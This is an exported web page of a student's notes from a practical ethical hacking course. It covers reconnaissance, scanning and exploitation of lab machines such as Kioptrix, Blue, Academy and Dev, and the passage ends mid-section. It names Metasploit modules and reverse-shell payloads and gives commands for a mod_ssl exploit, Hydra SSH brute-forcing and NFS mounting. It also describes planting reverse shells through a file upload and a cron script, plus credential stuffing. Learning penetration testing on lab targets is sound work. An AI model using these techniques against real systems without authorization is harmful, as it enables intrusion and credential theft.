<!DOCTYPE html> <html><head>
		<title>Practical Ethical Hacking</title>
		<base href="./">
		<meta id="root-path" root-path="./">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0">
		<meta charset="UTF-8">
		<meta name="description" content="sHadowSparK - index">
		<meta property="og:title" content="index">
		<meta property="og:description" content="sHadowSparK - index">
		<meta property="og:type" content="website">
		<meta property="og:url" content="index.html">
		<meta property="og:image" content="introduction-to-staged-vs-non-staged-payloads.webp">
		<meta property="og:site_name" content="sHadowSparK">
		<link rel="alternate" type="application/rss+xml" title="RSS Feed" href="lib/rss.xml"><script async="" id="webpage-script" src="lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="lib/media/favicon.png"><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-horizontal-spacing:0.6em;--tree-vertical-spacing:0.6em;--sidebar-margin:12px}.sidebar{height:100%;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));font-size:14px;z-index:10;position:relative;overflow:hidden;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}.sidebar-left{left:0}.sidebar-right{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}body.floating-sidebars .sidebar{position:absolute}.sidebar-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .sidebar-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}.sidebar-left .sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}.sidebar-right .sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar:has(.sidebar-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:2em;width:var(--sidebar-width);top:var(--sidebar-margin);padding-inline:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}.sidebar-left .sidebar-topbar{left:0}.sidebar-right .sidebar-topbar{right:0}.topbar-content{overflow:hidden;overflow:clip;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:0!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}.sidebar-left .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}.sidebar-right .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.sidebar-section-header{margin:0 0 1em 0;text-transform:uppercase;letter-spacing:.06em;font-weight:600}body{transition:background-color var(--color-fade-speed) ease-in-out}.webpage-container{display:flex;flex-direction:row;height:100%;width:100%;align-items:stretch;justify-content:center}.document-container{opacity:1;flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0;transition:opacity .2s ease-in-out}.document-container>.markdown-preview-view{margin:var(--sidebar-margin);margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;background-color:var(--background-primary);transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}.document-container>.markdown-preview-view>.markdown-preview-sizer{padding-bottom:80vh!important;width:100%!important;max-width:var(--line-width)!important;flex-basis:var(--line-width)!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}.markdown-rendered img:not([width]),.view-content img:not([width]){max-width:100%;outline:0}.document-container>.view-content.embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}.document-container>.view-content.embed>*{max-width:100%;max-height:100%;object-fit:contain}:has(> :is(.math,table)){overflow-x:auto!important}.document-container>.view-content{overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){if("file:"!=location.protocol){let e=document.querySelectorAll("include");for(let t=0;t<e.length;t++){let o=e[t],l=o.getAttribute("src");try{const e=await fetch(l);if(!e.ok){console.log("Could not include file: "+l),o?.remove();continue}let t=await e.text(),n=document.createRange().createContextualFragment(t),i=Array.from(n.children);for(let e of i)e.classList.add("hide"),e.style.transition="opacity 0.5s ease-in-out",setTimeout((()=>{e.classList.remove("hide")}),10);o.before(n),o.remove(),console.log("Included file: "+l)}catch(e){o?.remove(),console.log("Could not include file: "+l,e);continue}}}else{if(document.querySelectorAll("include").length>0){var e=document.createElement("div");e.id="error",e.textContent="Web server exports must be hosted on an http / web server to be viewed correctly.",e.style.position="fixed",e.style.top="50%",e.style.left="50%",e.style.transform="translate(-50%, -50%)",e.style.fontSize="1.5em",e.style.fontWeight="bold",e.style.textAlign="center",document.body.appendChild(e),document.querySelector(".document-container")?.classList.remove("hide")}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script"))),l=0;!function e(){let n=o[l];l++,n&&"true"!=n.getAttribute("loaded")||l<o.length&&e(),l<o.length?n.addEventListener("load",e):t()}()}</script><link rel="stylesheet" href="lib/styles/obsidian.css"><link rel="stylesheet" href="lib/styles/theme.css"><link rel="preload" href="lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="lib/styles/main-styles.css"></noscript></head><body class="publish css-settings-manager theme-light show-inline-title show-ribbon show-urls show-close-buttons show-file-explorer-navigation no-lp-heading-level-indicator"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="webpage-container workspace"><div class="sidebar-left sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"><label class="theme-toggle-container" for="theme_toggle"><input class="theme-toggle-input" type="checkbox" id="theme_toggle"><div class="toggle-background"></div></label></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content"></div><script defer="">let ls = document.querySelector(".sidebar-left"); ls.classList.add("is-collapsed"); if (window.innerWidth > 768) ls.classList.remove("is-collapsed"); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div><div class="document-container markdown-reading-view hide"><div class="markdown-preview-view markdown-rendered allow-fold-headings allow-fold-lists is-readable-line-width"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><h1 data-heading="Introduction to Linux" class="heading" id="Introduction_to_Linux">Networking Refresher</h1><div class="heading-wrapper"><div class="heading-children"><div><p>Short refresher on <strong>IP Address</strong>, <strong>MAC Address</strong> and <strong>Subnets</strong>.</p></div></div></div><div class="heading-wrapper"><h1 data-heading="Introduction to Linux" class="heading" id="Introduction_to_Linux">Introduction to Linux</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>Brushed up <em>basic</em> commands like <code>ls</code>, <code>cd</code>, <code>touch</code>, <code>mkdir</code>, <code>cat</code>, <code>echo</code> etc. </p>
</li>
<li data-line="2">
<p>Wrote a <strong>Bash Script</strong> to <em>sweep IP's</em> on my local network.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Introduction to Python" class="heading" id="Introduction_to_Python">Introduction to Python</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p><em>Basic Programming</em> skills in Python.</p>
</li>
<li data-line="2">
<p>Wrote a basic <strong>Port Scanner</strong> in Python.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="The Ethical Hacker Methodology" class="heading" id="The_Ethical_Hacker_Methodology">The Ethical Hacker Methodology</h1><div class="heading-children"><div><p>There are <strong>five</strong> major steps behind any <em>Hack</em> or <em>Pentest</em>:</p></div><div><ol>
<li data-line="0"><mark>Information Gathering (Reconnaissance)</mark></li>
<li data-line="1"><mark>Scanning &amp; Enumeration</mark></li>
<li data-line="2"><mark>Gaining Access</mark></li>
<li data-line="3"><mark>Maintaining Access</mark></li>
<li data-line="4"><mark>Covering Tracks</mark></li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Information Gathering (Reconnaissance)" class="heading" id="Information_Gathering_(Reconnaissance)">Information Gathering (Reconnaissance)</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p><strong>Reconnaissance</strong> can broadly classified into two types:<br>
<strong>(i)</strong> <mark>Passive Reconnaissance</mark>: This involves gathering info about the <strong>target</strong> from external sources like the <em>Internet</em>, <em>Search Engines</em>, <em>Social Media</em> etc. The <em>pentester</em> doesn't actively engage with the target.<br>
<strong>(ii)</strong> <mark>Active Reconnaissance</mark>: We can use this method to <em>probe</em> a system for <em>weaknesses</em>, often risking <em>early detection</em>. Of the two, this is the fastest method of recon, actively searching for <em>vulnerabilities</em> or <em>entre points</em>.</p>
</li>
<li data-line="4"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>The key steps in gathering info about a <em>Web/Host</em>: </p>
<ul>
<li data-line="5"><mark>Target Validation</mark>: WHOIS, nslookup, dnsrecon</li>
<li data-line="6"><mark>Finding Subdomains</mark>: Google Fu, dig, Nmap, Sublist3r, Bluto, crt.sh, etc.</li>
<li data-line="7"><mark>Fingerprinting</mark>: Nmap, Wappalyzer, WhatWeb, BuiltWith, Netcat</li>
<li data-line="8"><mark>Data Breaches</mark>:HaveIBeenPwned, Breach-Parse, WeLeakInfo</li>
</ul>
</li>
<li data-line="10"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>We can start by trying to find <strong>important emails</strong> associated with our target, his place of work, his co-workers and try to track his online activity.</p>
<p>  Some resources to achieve this are:</p>
<ul>
<li data-line="13"><mark><a data-tooltip-position="top" aria-label="https://hunter.io/" rel="noopener" class="external-link" href="https://hunter.io/" target="_blank">hunter.io</a></mark>: Good source to search for <em>Domain</em> based emails.</li>
<li data-line="14"><mark><a data-tooltip-position="top" aria-label="https://phonebook.cz/" rel="noopener" class="external-link" href="https://phonebook.cz/" target="_blank">phonebook.cz</a></mark>: Great free site for domain based <em>OSINT</em>.</li>
<li data-line="15"><mark><a data-tooltip-position="top" aria-label="https://www.voilanorbert.com/" rel="noopener" class="external-link" href="https://www.voilanorbert.com/" target="_blank">Voilanorbert</a></mark>: Another good source for look for <em>emails</em>.</li>
<li data-line="16"><mark><a data-tooltip-position="top" aria-label="https://clearbit.com/resources/tools/connect" rel="noopener" class="external-link" href="https://clearbit.com/resources/tools/connect" target="_blank">Clearbit Connect</a></mark>: Instructor recommended but only supports <em>Chrome</em>.</li>
<li data-line="17"><mark><a data-tooltip-position="top" aria-label="https://tools.emailhippo.com/" rel="noopener" class="external-link" href="https://tools.emailhippo.com/" target="_blank">Email Hippo</a></mark>: Site to verify whether a <em>email exists</em> or not.</li>
<li data-line="18"><mark>Google Forgot Password</mark>: To verify email and check for <em>recovery emails</em>.</li>
</ul>
</li>
<li data-line="20"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>Once you have the <strong>target emails</strong>, you could look them up in <em>leaked databases checker</em> sites to check for compromised credentials. </p>
<ul>
<li data-line="21"><mark><a data-tooltip-position="top" aria-label="https://dehashed.com/" rel="noopener" class="external-link" href="https://dehashed.com/" target="_blank">Dehashed.com</a></mark>: Instructor recommended but <em>Paid!!</em>.</li>
<li data-line="22"><mark><a data-tooltip-position="top" aria-label="https://haveibeenpwned.com/" rel="noopener" class="external-link" href="https://haveibeenpwned.com/" target="_blank">haveibeenpwned.com</a></mark>: Good for checking compromised <em>emails</em>.</li>
<li data-line="23"><mark>breachdirectory.org</mark>: Great site for checking compromised <em>passwords</em>.</li>
</ul>
</li>
<li data-line="25"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>Another <em>OSINT</em> technique involves finding all <strong>subdomains</strong> of the target:</p>
<ul>
<li data-line="26"><mark>sublist3r</mark>: <em>Python Script</em> to lookup domains using various <em>search engines</em>.</li>
<li data-line="27"><mark><a data-tooltip-position="top" aria-label="https://crt.sh/" rel="noopener" class="external-link" href="https://crt.sh/" target="_blank">crt.sh</a></mark>: Amazing website to check for <em>digital certifications</em> issued to various <em>subdomains</em>. </li>
</ul>
</li>
<li data-line="29">
<p><strong>Amass</strong> is one of the most popular OSINT tool for website enumeration like finding subdomains etc. It is built by the OWASP company itself and considered by many as all-in-one tool for reconnaissance. </p>
<p> Sometimes all the domains gathered using <em>Amass</em> cannot not be reached directly over <mark>HTTP/HTTPS</mark>. The filter out reachable domains we could use a tool called <strong>HttpProbe</strong> by <a data-tooltip-position="top" aria-label="https://github.com/tomnomnom" rel="noopener" class="external-link" href="https://github.com/tomnomnom" target="_blank">tomnomnom</a>.</p>
</li>
<li data-line="33"><div class="list-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>
<p>Next task after figuring out a <em>domain</em> or <em>website</em> is enumerating the framework it is built upon. Various tools can be used for this task.</p>
<ul>
<li data-line="34"><mark><a data-tooltip-position="top" aria-label="https://builtwith.com/" rel="noopener" class="external-link" href="https://builtwith.com/" target="_blank">Built With</a></mark>: The most comprehensive tool for in-depth website framework <em>enumeration</em>.</li>
<li data-line="35"><mark><a data-tooltip-position="top" aria-label="https://addons.mozilla.org/en-US/firefox/user/3609035/" rel="noopener" class="external-link" href="https://addons.mozilla.org/en-US/firefox/user/3609035/" target="_blank">Wappalyzer</a></mark>: <em>Browser extension</em> for quickly checking website's framework technologies.</li>
<li data-line="36"><mark>whatweb</mark>: <em>Kali</em> built-in website enumeration tool.</li>
</ul>
</li>
<li data-line="38">
<p><strong>Burpsuite</strong> is web penetration testing tool that allows us to <em>intercept</em> all our web traffic and <em>modify</em> requests and automatically scan the website to find important <em>info</em> and <em>vulnerabilities</em>. It is one of the most widely used web application <em>enumeration</em> tool.</p>
</li>
<li data-line="40">
<p><strong>Google Fu</strong> derived from <em>Kung Fu</em> is basically about the <em>art of Googling</em>. It involves how effectively you are able to lookup data related to your target and find <em>useful files</em> and <em>search results</em> which would usually not be presented to the average user. Eg: <code>site:tesla.com -www filetype:pdf</code>. A good source for such <strong>Google Dorks</strong> is <mark><a data-tooltip-position="top" aria-label="https://www.searchenginejournal.com/google-search-operators-commands/215331/" rel="noopener" class="external-link" href="https://www.searchenginejournal.com/google-search-operators-commands/215331/" target="_blank">Click Me</a></mark>.</p>
</li>
<li data-line="42">
<p>The importance of <strong>Social Media</strong> in reconnaissance if incomparable. Scanning through social media sites like <code>twitter.com</code>, <code>linkedin.com</code> etc. for <em>badge photos</em>, <em>employees</em> details and other crucial information can prove to be extremely valuable in our reconnaissance. Its the people that are the <em>weakest links</em> of any organization.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Scanning &amp; Enumeration" class="heading" id="Scanning_&amp;_Enumeration">Scanning &amp; Enumeration</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>This phase involves <em>scanning</em> the target for <strong>vulnerabilities</strong>, <em>examining</em> the <strong>technologies</strong> used by the target and looking out of any known <strong>exploits</strong> for those technologies. It basically involves getting to know your target better so that you can figure out where to <strong>attack</strong>.</p>
</li>
<li data-line="2">
<p>First step in achieving this is scanning the <em>target/s</em> using <strong>Nmap</strong> to know everything about the devices on the local network, their <em>open ports</em>, the applications <em>listening</em> on that port, their <em>versions</em> and the <em>OS</em> used on those machines.</p>
</li>
<li data-line="4">
<p>After we have done basic <em>enumeration</em> we will look for any known <em>vulnerabilities</em> for the technologies used on the machines. This can be done through multiple ways:<br>
<strong>(i)</strong> <mark>Nikto</mark>: This is the <em>first</em> scanning tool that should be used. It is inbuilt in <em>Kali</em> and can be used for scanning the target for <em>application version</em> detection and for finding known <em>vulnerabilities</em>. It is pretty basic but gives a solid initial overview about the target.<br>
<strong>(ii)</strong> <mark>Nessus</mark>: It is a very popular <em>automated</em> vulnerability scanner. It gives a <em>in-depth</em> vulnerability report about the target and is often used to check for popular vulnerabilities. It is good for thoroughly analyzing the targets.<br>
<strong>(iii)</strong> <mark>Manual Enumeration</mark>: Even popular tools like <em>Nessus</em> are not able to capture every vulnerability on the target machines. We have to manually enumerate various technologies used on that machine and look for <em>critical sectors</em>. Manual Enumeration helps us <em>refining</em> the search process.</p>
</li>
<li data-line="9">
<p>If a <em>web server</em> is hosted on the target machine we can run a <em>dictionary</em> based attack using <strong>dirb</strong> or <strong>dirbuster</strong> to find various directories and pages served by the machine. Scanning through those directories and pages can give us meaningful insights about the machine and provide us with a new attack surface for <em>Web Application</em> based attacks like <em>remote code execution</em>, <em>SQL Injection</em> etc. We can also use <em>BurpSuite</em> to manipulate our web requests and explore different responses returned by the web server.</p>
</li>
<li data-line="11">
<p>For the <strong>Kioptrix 1</strong> machine used in this course, we found several vulnerabilities for listed technologies:<br>
<strong>(i)</strong> <mark>mod_ssl/2.8.4 OpenSSL/0.9.6b</mark>: Remote Buffer Overflow<br>
<strong>(ii)</strong> <mark>Samba 2.2.1a</mark>: Remote Buffer Overflow<br>
<strong>(iii)</strong> ==OpenSSH 2.9p2 ==: AFS Token Buffer Overflow</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="Exploitation Basics" class="heading" id="Exploitation_Basics">Exploitation Basics</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p>In this section we aim to exploit the various <em>vulnerabilities</em> discovered in our target. We start by using already available exploits and also by manually exploiting a target's vulnerability. We can use <strong>Metasploit</strong> which has a large <em>collection</em> of popular exploits. We could also compile our own exploits and use them manually against our target. We will also explore brute forcing attacks using <strong>Hydra</strong> as well as <em>password spraying</em> and <em>credential stuffing</em> using <strong>Burpsuite</strong>. </p>
</li>
<li data-line="2">
<p>During any exploitation <em>attempt</em>, our main goal is to get a <strong>Shell</strong> on the target machine. A <em>shell</em> basically provides us with an <em>interface</em> to interact with the machine. There are generally two different types of shell:</p>
<p> <strong>(i)</strong> <mark>Bind Shell</mark>: In this case a <em>malicious</em> program opens a network port on a victim’s machine, waiting for an incoming connection from an attacker. The attacker then connects to this open port, and gains control over the victim’s system. </p>
<p> <code>To launch a bind shell, the attacker must have the IP address of the victim to access the target computer.</code></p>
<p> <strong>(ii)</strong> <mark>Reverse Shell</mark>: In this the attacker must first start a <em>server</em> on his machine, while the target machine will have to act as a client that connects to the server served by the attacker. After the successful connection, the attacker can gain access to the shell of the target computer.</p>
<p> <code>To launch a Reverse shell, the attacker doesn’t need to know the IP address of the victim to access the target computer.</code></p>
<p> <strong>Reverse Shells</strong> are commonly used in scenarios where the victim’s machine is behind a <em>firewall</em> or <em>NAT</em> (Network Address Translation).</p>
</li>
<li data-line="14">
<p>To exploit our target we use a <strong>Payload</strong>. A <em>payload</em> in cybersecurity is a <em>code</em> that is designed to perform <em>malicious</em> activities on a victim’s computer or network. It is the part of a <em>malware</em> that is responsible for carrying out the attack. There are generally two types of payloads:</p>
<p> <strong>(i)</strong> <mark>Stageless Payload</mark>: It is a <em>single</em> payload that includes the <em>exploit</em> and <em>complete shell code</em> necessary to complete the chosen task. Due to their all-encompassing nature, these payloads are by definition more <em>stable</em> than their alternatives but are also much <em>more complex</em> and significantly <em>larger</em> in size.<br>
<span alt="introduction-to-staged-vs-non-staged-payloads.webp" src="introduction-to-staged-vs-non-staged-payloads.webp" class="internal-embed media-embed image-embed is-loaded"><img alt="introduction-to-staged-vs-non-staged-payloads.webp" src="introduction-to-staged-vs-non-staged-payloads.webp"></span><br>
<strong>(ii)</strong> <mark>Staged Payload</mark>: It is slightly more <em>complicated</em>, in the sense that it has  to <em>beacon</em> out to another device called the <strong>C2 server</strong> (The initial executable is typically called a “<em>Dropper</em>”) to receive a second “<em>Stage</em>”, which contains a more full and <em>complete</em> program. It is a <em>multi-stage</em> exploit.<br>
<span alt="staged-vs-non-staged-payloads2.webp" src="staged-vs-non-staged-payloads2.webp" class="internal-embed media-embed image-embed is-loaded"><img alt="staged-vs-non-staged-payloads2.webp" src="staged-vs-non-staged-payloads2.webp"></span></p>
</li>
<li data-line="20">
<p><strong>Exploit 1</strong>: <mark>[Samba 2.2.1a] Remote Buffer Overflow</mark><br>
Luckily the exploit for this vulnerability is included with <em>Metasploit</em>. The exploit used in this case is <strong>trans2open</strong>. We simply have to fire up Metasploit and search for this exploit. After selecting this exploit we have to configure our <em>RHOST</em> option to our target machine. </p>
<p>  The payload selected by <em>default</em> with this exploit is a <em>staged payload</em> namely <code>linux/x86/meterpreter/reverse_tcp</code> which doesn't work. Instead we have to change to a <em>stageless payload</em> namely <code>linux/x86/shell_reverse_tcp</code>. </p>
</li>
<li data-line="25">
<p><strong>Exploit 2</strong>: <mark>[mod_ssl/2.8.4 OpenSSL/0.9.6b] Remote Buffer Overflow</mark><br>
Searching through the <em>Exploit Database</em> we found a exploit for this vulnerability by the name of <strong>OpenFuckV2</strong>. We have a <em>source code</em> file for the exploit in <em>C</em> language which we have to compile to get a executable. To run that executable we have to supply the required arguments as follows:<br>
<code>./OpenFuck target box [port] [-c N]</code></p>
<p>  Our <em>target code</em> depending on the <em>Apache version</em> and <em>operating system</em> used by target machine used is <strong>0x6b</strong>. Thus the command to execute is:<br>
<code>./OpenFuck 0x6b 192.168.75.130 -c 40</code></p>
</li>
<li data-line="32">
<p><strong>Exploit 3</strong>: <mark>[OpenSSH 2.9p2] Brute Force Attack</mark><br>
In this case we are <em>not exploiting</em> a vulnerability but rather <em>brute-forcing</em> the password for the machine's <em>ssh server</em> using <strong>Hydra</strong>. Unfortunately, the <em>OpenSSH</em> version used by the target is very old and the <em>kexAlgorithms</em> and <em>ciphersuites</em> used for connecting to the ssh server are not supported by default on Kali. </p>
<p>  We have to modify SSH Client settings to support wide compatibility in <em>Hardening</em> menu of <em>Kali Tweaks</em>. We have to also delete any pre-existing ssh config files in <code>~/.ssh/config</code> otherwise the tweak won't work. Only then we can brute force passwords using <em>Hydra</em> on the target's <em>ssh server</em>.<br>
<code>hydra -l root -P ./wordlist.txt ssh://192.168.75.130 -t 4 -V</code>.</p>
<p>  <a data-tooltip-position="top" aria-label="https://github.com/vanhauser-thc/thc-hydra/issues/792#" rel="noopener" class="external-link" href="https://github.com/vanhauser-thc/thc-hydra/issues/792#" target="_blank">More info can be found here!</a></p>
</li>
<li data-line="40">
<p>We can also brute force <em>website login pages</em> using a tool called <strong>Burpsuite</strong>. First we have to <em>intercept</em> our <em>POST</em> request on the login page to identify the <em>username</em> and <em>password</em> fields in the request. Then we can send that <em>request</em> to the <strong>Intruder</strong> where we can <em>re-send</em> that request multiple times using a different set of username:password. </p>
<p> First attack which we will use is <strong>credential stuffing</strong>. In this we try to inject breached account credentials in hopes of account takeover. We can find these leaked credentials in credential database leaks. We can also try setting a fixed username and then brute force the passwords and vice versa. This process is known as <strong>password spraying</strong>. This process is often automated and occurs slowly over time in order to remain undetected.</p>
</li>
</ol></div></div></div><div class="heading-wrapper"><h1 data-heading="New Capstone" class="heading" id="New_Capstone">New Capstone</h1><div class="heading-children"><div><ol>
<li data-line="0">
<p><mark>Machine 1: <strong>Blue</strong></mark></p>
<p> The first target machine is based on <em>Windows 7</em>. When running <em>NMAP</em> against the target we don't find any interesting information or ports. So, we simply start by searching any known vulnerabilities or exploits for that specific version of Windows.</p>
<p>  We come across a exploit developed by NSA namely <strong>Eternal Blue</strong> which targets <em>MS17-010</em> bug on Windows machines. This exploit can be simply used from Metasploit to check whether the target is vulnerable and if yes then to attack the target. The Metasploit module is: <code>exploit/windows/smb/ms17_010_eternalblue</code><br>
We can also manually use the exploit without the help of Metasploit by following instructions on existing Github repositories like <strong><a data-tooltip-position="top" aria-label="https://github.com/3ndG4me/AutoBlue-MS17-010" rel="noopener" class="external-link" href="https://github.com/3ndG4me/AutoBlue-MS17-010" target="_blank">AutoBlue-MS17-010</a></strong> by <strong>3ndG4me</strong>.</p>
</li>
<li data-line="7">
<p><mark>Machine 2: <strong>Academy</strong></mark></p>
<p> This is a <em>Debian</em> based Linux Machine. The machine's <em>network service</em> has to be initiated before it can be hacked by logging in as <strong>root@tcm</strong> and executing <code>dhclient</code> command. Running a <em>NMAP</em> scan against it reveals something interesting. It has a <strong>open FTP</strong> port which allows <mark>Anonymous Login!</mark> Also, it has a <strong>Apache Webserver</strong> hosted on <em>port 80</em> as well a <strong>OPENSSH</strong> port at <em>22</em>.</p>
<p> We start by logging into <em>FTP client</em> on target using <strong>anonymous@anonymous</strong> as credentials. There we find a file named <code>note.txt</code> which we download to our machine. In that <code>note.txt</code> we find a possible <em>username</em> and its <em>password hash</em> for a login page on the target machine. We identify the hash as a MD5 hash using <strong>hash-identifier</strong>. We then crack that hash using <strong>hashcat</strong> using <em>rockyou.txt</em> wordlist.</p>
<p> Then we use <strong>dirb</strong> or <strong>dirbuster</strong> to find the <em>URL</em> for the login page. After that we login to that page using the <em>snooped credentials</em>. On that login page, under the <em>profile section</em> we find an option to upload our profile picture which we use for <em>file upload</em> vulnerability. We upload a <em>PHP reverse shell</em> script from Pentest Monkey to get get a reverse shell on our machine. After getting shell access our new goal is <em>privilege escalation</em> to get <strong>root</strong>.</p>
<p> We use a script called <code>linpeas.sh</code> that searches for possible paths to <em>escalate</em> privileges on Linux. We upload that script to target by hosting a webserver on our machine and execute it. We find a potential user's credentials namely <strong>grimmie@My_V3ryS3cur3_P4ss</strong>. We <em>ssh</em> into the target using these credentials. Now we use another script <code>pspy64</code> which is used to snoop on <em>processes</em> without need for root permissions. This reveals a <code>backup.sh</code> script which is executed every minute and is modifiable by <em>grimmie</em>. We append a bash reverse shell <em>script</em> in that file and get a reverse shell from target as <strong>root</strong> to our machine.</p>
<p> <code>Note: Once a hash has been cracked, hashcat won't crack it again and we can find the cracked passwords stored at ~/.local/share/hashcat/hashcat.potfile.</code><br>
</p>
</li>
<li data-line="19">
<p><mark>Machine 3: <strong>Dev</strong></mark></p>
<p> This is another <em>Debian</em> based Linux Machine. A <em>NMAP</em> scan reveals the following open ports of significance: <strong>Apache server</strong> at port <em>80</em>, another <strong>Apache server</strong> at port <em>8080</em>, <strong>OPENSSH</strong> at port <em>22</em> and <strong>NFS</strong> at port <em>2049</em>.<br>
We start with <strong>NFS</strong>(Network File Sharing) service which is used to mount remote folders to our machine and access them locally. To find mountable folders on the target we use <code>showmount -e &lt;target ip&gt;</code>. This lists the mountable folders through NFS namely <code>/srv/nfs</code> which we then mount using <code>mount -t nfs 192.168.75.134:/srv/nfs ~/Desktop/nfs</code>.</p>
